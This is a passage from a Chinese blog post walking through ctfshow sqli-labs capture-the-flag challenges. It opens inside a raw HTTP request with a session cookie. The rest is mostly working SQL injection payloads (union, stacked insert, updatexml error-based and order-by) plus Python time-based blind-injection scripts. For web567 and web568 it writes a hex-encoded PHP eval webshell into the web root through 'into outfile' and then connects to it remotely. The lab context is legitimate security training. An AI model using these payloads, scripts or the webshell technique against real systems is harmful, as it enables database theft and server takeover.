class="comment">Sec-Fetch-Dest: document</span></span><br><span class="line"><span class="comment">Referer: https://bbd41d07-549c-4094-b38a-fb8c3a7589c3.challenge.ctf.show/</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate, br, zstd</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: cf_clearance=ZuK66QChNGftyyiGS39xGqXjRvrgqwc7dpOpwNp8hgY-1747317016-1.2.1.1-SHtYMtmhonoQh3f9JFLxlX5e8ZPl2H.d.1t6d9JUkU8A48zWJ8kwl3L9eAExpcFayYenFfR8OxZ7NWlafUA3eW..1Ql.yEeMVQsO2dN0LeOWb9v9mBTw9f9lNiJBsuz0wNfBuxQoVypAzPhH9KeUpkB22hemlwS35.DR.pfloutzMUBCc7K.SMPWBv0hD22WPrXL6TOwx.8Vlv0exiJGfJydMDF8Fmgi7BwFDHfm8A27bqv1xzCh1xdEneeUo.dok_1cBQWYDpbP2ClHu0miDKBW2hnvhGXG7HbMovGYSE3c1QFXa0TPiCQYSEXDX_10Bnlxz9QrXZujCxO7ZGcQA_vDxzoYodJRpDZrLpAsbq8</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">uname=1%df&#x27;+union+select+1,(select+flag4s+from+ctfshow.flags)--+&amp;passwd=1&amp;submit=Submit</span></span><br></pre></td></tr></table></figure>

<h2 id="web558"><a href="#web558" class="headerlink" title="web558"></a>web558</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="#堆叠注入"></a>#堆叠注入</h3><p>先看看该题目堆叠注入的代码是怎么实现的</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># id 参数直接带入到 SQL 语句中</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=&#x27;<span class="variable">$id</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (mysqli_multi_query(<span class="variable">$con1</span>, <span class="variable">$sql</span>)):</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print_r(mysqli_error(<span class="variable">$con1</span>));</span><br></pre></td></tr></table></figure>

<p><code>mysqli_multi_query</code> 函数用于执行一个 SQL 语句，或者多个使用分号分隔的 SQL 语句。这个就是堆叠注入产生的原因，因为本身就支持多个 SQL 语句。</p>
<p>既然这样的话我们尝试插入数据</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=20&#x27;;<span class="keyword">insert</span> <span class="keyword">into</span> users(id,username,<span class="keyword">password</span>) <span class="keyword">values</span> (<span class="number">20</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="string">&quot;test&quot;</span>)--+</span><br><span class="line">?id=<span class="number">20</span></span><br></pre></td></tr></table></figure>

<p>需要传两次，第一次是执行插入语句，第二次是查询</p>
<p>说明这里是可以进行堆叠注入的，那我们将注入的语句得到的结果插入表中</p>
<p>insert into插入语句是不能覆盖原有数据的，所以id得一直改新的</p>
<figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27;;insert <span class="keyword">into</span> users(<span class="built_in">id</span>,username,password) values (<span class="number">21</span>,(select <span class="built_in">version</span>()),<span class="string">&quot;test&quot;</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27;;insert <span class="keyword">into</span> users(<span class="built_in">id</span>,username,password) values (<span class="number">22</span>,(select group_concat(schema_name)<span class="keyword">from</span> information_schema.schemata),<span class="string">&quot;test&quot;</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27;;insert <span class="keyword">into</span> users(<span class="built_in">id</span>,username,password) values (<span class="number">24</span>,(select group_concat(table_name)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=&#x27;ctfshow&#x27;),<span class="string">&quot;test&quot;</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27;;insert <span class="keyword">into</span> users(<span class="built_in">id</span>,username,password) values (<span class="number">26</span>,(select group_concat(column_name)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=&#x27;flags&#x27;),<span class="string">&quot;test&quot;</span>)<span class="comment">--+</span></span><br><span class="line"></span><br><span class="line">?<span class="built_in">id</span>=<span class="number">1</span>&#x27;;insert <span class="keyword">into</span> users(<span class="built_in">id</span>,username,password) values (<span class="number">27</span>,(select group_concat(flag4s) <span class="keyword">from</span> ctfshow.flags),<span class="string">&quot;test&quot;</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>不知道为什么，在爆flag和数据库的时候爆不出来，后面只能打联合注入了</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">-1</span>&#x27; <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag4s <span class="keyword">from</span> ctfshow.flags)--+</span><br></pre></td></tr></table></figure>

<h2 id="web559"><a href="#web559" class="headerlink" title="web559"></a>web559</h2><h3 id="数字型联合注入"><a href="#数字型联合注入" class="headerlink" title="#数字型联合注入"></a>#数字型联合注入</h3><p>直接打联合注入吧</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag4s <span class="keyword">from</span> ctfshow.flags)</span><br></pre></td></tr></table></figure>

<h2 id="web560"><a href="#web560" class="headerlink" title="web560"></a>web560</h2><h3 id="单引号括号联合注入"><a href="#单引号括号联合注入" class="headerlink" title="#单引号括号联合注入"></a>#单引号括号联合注入</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span>&#x27;) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>和之前的相比只是闭合方式</p>
<figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">0</span>&#x27;) <span class="built_in">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,(<span class="keyword">select</span> flag4s <span class="keyword">from</span> ctfshow.flags)--+</span><br></pre></td></tr></table></figure>

<h2 id="web561"><a href="#web561" class="headerlink" title="web561"></a>web561</h2><p>还是数字型联合注入？？？这是什么出题顺序，我甚至怀疑是不是我自己漏了知识点</p>
<h2 id="web562"><a href="#web562" class="headerlink" title="web562"></a>web562</h2><h3 id="POST单引号报错注入"><a href="#POST单引号报错注入" class="headerlink" title="#POST单引号报错注入"></a>#POST单引号报错注入</h3><p>一个登录界面</p>
<p>传入<code>1&#39;/1&#39;</code>有报错信息，但是这个貌似没有回显结果，考虑报错注入或者盲注吧</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_password</span>=<span class="number">1</span>%<span class="number">27</span>&amp;login_user=<span class="number">1</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>

<p>测了一下注入点在password</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_password</span>=<span class="number">1</span>%<span class="number">27</span>+or+(select+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select version()),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;login_user=<span class="number">1</span>&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"><span class="attribute">login_password</span>=<span class="number">1</span>%<span class="number">27</span>+or+(select+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(select flag4s from ctfshow.flags),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;login_user=<span class="number">1</span>&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"><span class="attribute">login_password</span>=<span class="number">1</span>%<span class="number">27</span>+or+(select+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,right((select flag4s from ctfshow.flags),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;login_user=<span class="number">1</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>

<h2 id="web563"><a href="#web563" class="headerlink" title="web563"></a>web563</h2><h3 id="POST单引号括号报错注入"><a href="#POST单引号括号报错注入" class="headerlink" title="#POST单引号括号报错注入"></a>#POST单引号括号报错注入</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">login_password</span>=<span class="number">1</span>%<span class="number">27</span>)+or+(select+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,left((select flag4s from ctfshow.flags),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;login_user=<span class="number">1</span>&amp;mysubmit=Login</span><br><span class="line"></span><br><span class="line"><span class="attribute">login_password</span>=<span class="number">1</span>%<span class="number">27</span>+or+(select+updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,right((select flag4s from ctfshow.flags),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>))--+&amp;login_user=<span class="number">1</span>&amp;mysubmit=Login</span><br></pre></td></tr></table></figure>

<h2 id="web564"><a href="#web564" class="headerlink" title="web564"></a>web564</h2><h3 id="order-by报错注入"><a href="#order-by报错注入" class="headerlink" title="#order by报错注入"></a>#order by报错注入</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GET 方式获取 sort 参数</span></span><br><span class="line"><span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;sort&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接将 id 带入 SQL 中</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM users ORDER BY <span class="subst">$id</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> 查询成功：</span><br><span class="line">    输出查询信息</span><br><span class="line"><span class="keyword">else</span>：</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">mysql_error</span>());</span><br></pre></td></tr></table></figure>

<p>order by 后面不能跟联合注入，例如我们传入?sort&#x3D;1</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605182533287.png" alt="image-20250605182533287"></p>
<p>此时结果集会按照第一列的顺序排列输出，那么这里的话可以打报错注入或者时间盲注</p>
<p>如果是时间盲注的话直接在后面加上注入语句就行了</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span><span class="params">(substr(database()</span></span>,&#123;i&#125;,<span class="number">1</span>)=<span class="string">&#x27;&#123;char&#125;&#x27;</span>,<span class="built_in">sleep</span>(<span class="number">0.05</span>),<span class="number">0</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://2b259308-bc30-412a-ac3b-7e8977e97f94.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;?sort=if(ascii(substr((select flag4s from ctfshow.flags),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.25),1)&quot;</span></span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        end = time.time() - start</span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">2.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当然也可以直接用报错注入</p>
<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?sort=<span class="number">1</span><span class="symbol">&#x27;and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> version()),<span class="number">0</span>x7e),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<p>另外也可以传马，这种方法我没有成功，可能设置了权限吧</p>
<h2 id="web565"><a href="#web565" class="headerlink" title="web565"></a>web565</h2><h3 id="单引号-order-by报错注入"><a href="#单引号-order-by报错注入" class="headerlink" title="#单引号 order by报错注入"></a>#单引号 order by报错注入</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?sort=<span class="number">1</span><span class="symbol">&#x27;and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,(<span class="keyword">select</span> flag4s from ctfshow.flags),<span class="number">0</span>x7e),<span class="number">1</span>)<span class="comment">--+</span></span><br><span class="line">/?sort=<span class="number">1</span><span class="symbol">&#x27;and</span> updatexml(<span class="number">1</span>,concat(<span class="number">0</span>x7e,right((<span class="keyword">select</span> flag4s from ctfshow.flags),<span class="number">30</span>),<span class="number">0</span>x7e),<span class="number">1</span>)<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<h2 id="web566"><a href="#web566" class="headerlink" title="web566"></a>web566</h2><h3 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="#order by盲注"></a>#order by盲注</h3><p>和 上题 相比少了报错注入，时间盲注依然可以正常使用</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="built_in">sort</span>=<span class="keyword">if</span>(1,<span class="built_in">sleep</span>(0.25),1)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://a67753c2-c7b7-42dd-a6ba-85be30c1e30d.challenge.ctf.show/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">target = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    i += <span class="number">1</span></span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;?sort=if(ascii(substr((select flag4s from ctfshow.flags),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;mid&#125;</span>,sleep(0.25),1)&quot;</span></span><br><span class="line"></span><br><span class="line">        start = time.time()</span><br><span class="line">        r = requests.get(url + payload)</span><br><span class="line">        end = time.time() - start</span><br><span class="line">        <span class="keyword">if</span> end &gt; <span class="number">2.5</span>:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        target += <span class="built_in">chr</span>(head)</span><br><span class="line">        <span class="built_in">print</span>(target)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(target)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="web567"><a href="#web567" class="headerlink" title="web567"></a>web567</h2><h3 id="order-by-写文件"><a href="#order-by-写文件" class="headerlink" title="#order by 写文件"></a>#order by 写文件</h3><p>盲注打太慢了，换一种方法，用line terminated by 写文件</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/?sort=<span class="number">1</span> into outfile <span class="string">&quot;/var/www/html/1.php&quot;</span> lines terminated by <span class="number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020</span>--+</span><br><span class="line"></span><br><span class="line"><span class="number">0x3c3f706870206576616c28245f504f53545b315d293b3f3e2020</span>--+是<span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);<span class="meta">?&gt;</span>  的十六进制</span><br></pre></td></tr></table></figure>

<p>访问后连蚁剑</p>
<p>找到数据库文件</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605192659763.png" alt="image-20250605192659763"></p>
<p>连数据库拿flag就行</p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605193039640.png" alt="image-20250605193039640"></p>
<p><img src="/../image/achieve/202411/sqli-labs/image-20250605193055295.png" alt="image-20250605193055295"></p>
<p>这里使用的是mysqli_multi_query()函数，而之前使用的是mysqli_query()。区别在于mysqli_multi_query()可以执行多个sql 语句，而mysqli_query()只能执行一个sql 语句。因此我们可以注入执行多个sql 语句注入 statcked injection。</p>
<h2 id="web568"><a href="#web568" class="headerlink" title="web568"></a>web568</h2><h3 id="单引号order-by-写文件"><a href="#单引号order-by-写文件" class="headerlink" title="#单引号order by 写文件"></a>#单引号order by 写文件</h3><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sort<span class="punctuation">=</span><span class="number">1</span>&#x27; into outfile &quot;/var/www/html/1.php&quot; lines terminated by 0x3c3f<span class="number">70687020657661</span>6c<span class="number">2824</span>5f504f<span class="number">5354</span>5b315d293b3f3e<span class="number">2020</span>--+</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/sqli-labs/image-20250605193335124.png" alt="image-20250605193335124"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>刷了一天半总算是给刷完了，学到了很多姿势，但是不得不说一种姿势出好几道题真的没必要，只不过是换了闭合方式，可能是因为比较基础吧，巩固基础来着s</p>

    </div>

    
    
    
	
	<div>
	  
		
<div>
    
        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
    
</div>

	  
	</div>


    <footer class="post-footer">
          

<div class="post-copyright">
<ul>
  <li class="post-copyright-author">
      <strong>本文作者： </strong>wanTh3flag
  </li>
  <li class="post-copyright-link">
      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/06/04/ctfshow%E5%85%A5%E9%97%A8sqli-labs(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" title="ctfshow入门sqli-labs">https://wanth3f1ag.top/2025/06/04/ctfshow入门sqli-labs(已做完)/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/sqli-labs/" rel="tag"># sqli-labs</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/06/03/D-3CTF2025/" rel="prev" title="D^3CTF2025">
                  <i class="fa fa-angle-left"></i> D^3CTF2025
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/06/06/ctfshow%E5%85%A5%E9%97%A8phpCVE(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" rel="next" title="ctfshow入门phpCVE">
                  ctfshow入门phpCVE <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">45:52</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
